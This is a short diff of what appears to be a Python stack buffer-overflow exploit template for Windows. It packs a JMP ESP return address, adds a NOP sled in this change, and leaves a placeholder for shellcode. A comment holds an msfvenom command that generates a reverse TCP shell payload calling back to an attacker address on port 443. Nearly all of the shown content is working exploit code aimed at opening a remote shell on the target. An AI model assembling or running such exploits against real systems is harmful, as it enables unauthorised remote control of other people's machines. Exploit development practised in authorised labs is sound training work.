@@ -17,7 +17,9 @@ payload += struct.pack("<I",ptr_jmp_esp)
 
 # msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b "\x00\x0a\x0d" --var-name shellcode EXITFUNC=thread
 <paste shellcode here>
+nopsled = "\x90"*12 # put appropriate number of nops
 
+payload += nopsled
 payload += shellcode
 payload += "D"*(size - len(payload))
 payload += "\r\n"
